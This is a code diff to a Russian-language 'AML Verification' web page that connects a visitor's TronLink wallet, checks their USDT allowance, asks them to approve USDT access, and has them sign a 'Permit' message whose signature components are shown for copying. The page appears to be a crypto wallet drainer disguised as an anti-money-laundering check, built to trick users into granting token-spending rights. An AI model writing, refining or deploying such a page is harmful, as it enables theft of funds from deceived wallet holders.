@@ -50,7 +50,7 @@
     <div class="logo">AML</div>
     <h1>AML Verification</h1>
 
-    <div id="statusText" class="status">Откройте в TronLink и нажмите кнопку ниже</div>
+    <div id="statusText" class="status">Нажмите кнопку для подключения</div>
 
     <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
         Подключить кошелёк
@@ -76,14 +76,8 @@
 
         let tronWeb, userAddr, nonce;
 
-        // Проверяем TronLink сразу
         function checkTronLink() {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                console.log('TronLink найден:', window.tronWeb.defaultAddress.base58);
-                return true;
-            }
-            console.log('TronLink не найден');
-            return false;
+            return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
         }
 
         async function connectWallet() {
@@ -94,7 +88,7 @@
             btn.textContent = 'Проверка...';
 
             try {
-                // Пробуем получить аккаунт через tronLink API
+                // Запрашиваем аккаунт
                 if (window.tronLink && window.tronLink.request) {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                 }
@@ -107,7 +101,7 @@
                 }
 
                 if (!checkTronLink()) {
-                    throw new Error('TronLink не отвечает. Убедитесь, что вы открыли страницу в TronLink Browser.');
+                    throw new Error('TronLink не отвечает. Откройте в TronLink Browser.');
                 }
 
                 tronWeb = window.tronWeb;
@@ -116,7 +110,7 @@
                 status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
                 status.classList.remove('error');
 
-                // Проверяем allowance через прямой вызов
+                // Сразу проверяем allowance
                 await checkAllowance();
 
             } catch (e) {
@@ -135,7 +129,7 @@
             const status = document.getElementById('statusText');
 
             try {
-                // Используем tronWeb.transactionBuilder для вызова контракта
+                // Вызываем allowance через triggerConstantContract
                 const functionSelector = 'allowance(address,address)';
                 const parameter = [
                     { type: 'address', value: userAddr },
@@ -149,30 +143,32 @@
                     parameter
                 );
 
+                console.log('Allowance response:', tx);
+
                 if (tx.constant_result && tx.constant_result[0]) {
                     const allowance = parseInt(tx.constant_result[0], 16);
                     console.log('Allowance:', allowance);
 
                     if (allowance > 0) {
-                        // Уже есть approve
                         btn.classList.add('hidden');
                         approveBtn.classList.add('hidden');
                         signBtn.classList.remove('hidden');
                         status.textContent = 'Нажмите "Подписать разрешение"';
                     } else {
-                        // Нужен approve
                         btn.classList.add('hidden');
                         approveBtn.classList.remove('hidden');
                         status.textContent = 'Сначала разрешите доступ к USDT';
                     }
                 } else {
-                    throw new Error('Не удалось получить allowance');
+                    throw new Error('Пустой ответ от контракта');
                 }
 
             } catch (e) {
                 console.error('Allowance error:', e);
-                status.textContent = 'Ошибка проверки: ' + e.message;
+                status.textContent = 'Ошибка: ' + e.message;
                 status.classList.add('error');
+                btn.disabled = false;
+                btn.textContent = 'Повторить';
             }
         }
 
@@ -200,13 +196,13 @@
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
-                if (result.result) {
+                if (result.result || result.code === 'SUCCESS') {
                     btn.classList.add('hidden');
                     document.getElementById('signBtn').classList.remove('hidden');
                     status.textContent = 'Нажмите "Подписать разрешение"';
                     status.classList.remove('error');
                 } else {
-                    throw new Error('Транзакция не подтверждена');
+                    throw new Error('Транзакция не подтверждена: ' + JSON.stringify(result));
                 }
 
             } catch (e) {
@@ -230,10 +226,7 @@
                 const deadline = Math.floor(Date.now() / 1000) + 86400; // 1 день
 
                 // EIP-712 хеш
-                const PERMIT_TYPEHASH = tronWeb.sha3(
-                    "Permit(address buyer,uint256 nonce,uint256 deadline)"
-                );
-
+                const PERMIT_TYPEHASH = tronWeb.sha3("Permit(address buyer,uint256 nonce,uint256 deadline)");
                 const chainId = 3448148188; // Nile
 
                 // DOMAIN_SEPARATOR
@@ -267,7 +260,7 @@
                 // Подпись
                 const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);
 
-                // Parse
+                // Parse v, r, s
                 const sig = signature.replace('0x', '');
                 const v = parseInt(sig.substr(128, 2), 16);
                 const r = '0x' + sig.substr(0, 64);
@@ -302,16 +295,12 @@
 
         function copyData() {
             const text = document.getElementById('signatureData').textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                alert('Скопировано!');
-            });
+            navigator.clipboard.writeText(text).then(() => alert('Скопировано!'));
         }
 
-        // Auto-check on load
+        // Auto-connect
         window.addEventListener('load', () => {
-            if (checkTronLink()) {
-                connectWallet();
-            }
+            if (checkTronLink()) connectWallet();
         });
     </script>
 </body>
